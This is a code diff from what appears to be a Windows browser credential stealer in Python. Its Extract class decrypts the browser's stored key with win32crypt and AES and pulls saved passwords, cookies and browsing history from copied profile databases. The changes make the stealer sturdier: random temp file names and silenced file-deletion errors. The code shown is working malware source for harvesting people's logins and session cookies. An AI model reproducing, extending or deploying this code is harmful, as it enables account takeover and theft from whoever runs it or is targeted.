@@ -4,8 +4,8 @@ import base64
 import win32crypt
 import sqlite3
 import shutil
-import string
-import random
+
+from core import utils
 
 from Crypto.Cipher import AES
 
@@ -59,7 +59,6 @@ class Extract:
     def __init__(self, browserLocalState: str) -> None:
         self.key = self.getKey(browserLocalState)
 
-
     def getKey(self, path: str):
         with open(path, "r") as f:
             localstate = json.loads(f.read())
@@ -89,7 +88,7 @@ class Extract:
     def extractPasswd(self, path: str) -> dict:
         creds = {}
 
-        tempfile = f"{temp}\\{random.choices(string.ascii_lowercase)}"
+        tempfile = f"{temp}\\{utils.random_string.get(10)}"
 
         try:
             shutil.copy(path, tempfile)
@@ -111,7 +110,10 @@ class Extract:
         except FileNotFoundError:
             return "Null"
 
-        finally: os.remove(tempfile)
+        finally: 
+            try:
+                os.remove(tempfile)
+            except: PermissionError
 
         return creds
     
@@ -121,7 +123,7 @@ class Extract:
         downloads = {}
         history = {"terms": terms, "download": downloads, "visited": visited}
 
-        tempfile = f"{temp}\\{random.choices(string.ascii_lowercase)}"
+        tempfile = f"{temp}\\{utils.random_string.get(10)}"
 
         try:
             shutil.copy(path, tempfile)
@@ -147,14 +149,16 @@ class Extract:
             db.close()
         
         finally:
-            os.remove(tempfile)
+            try:
+                os.remove(tempfile)
+            except: PermissionError
 
         return history
     
     def extractCookies(self, orginal_path: str):
         cookies = {}
 
-        tempfile = f"{temp}\\{random.choices(string.ascii_lowercase)}"
+        tempfile = f"{temp}\\{utils.random_string.get(10)}"
 
         try:
             if os.path.exists(f"{orginal_path}\\Network"):
@@ -177,7 +181,9 @@ class Extract:
             db.close()
 
         finally:
-            os.remove(tempfile)
+            try:
+                os.remove(tempfile)
+            except: PermissionError
 
         return cookies
     
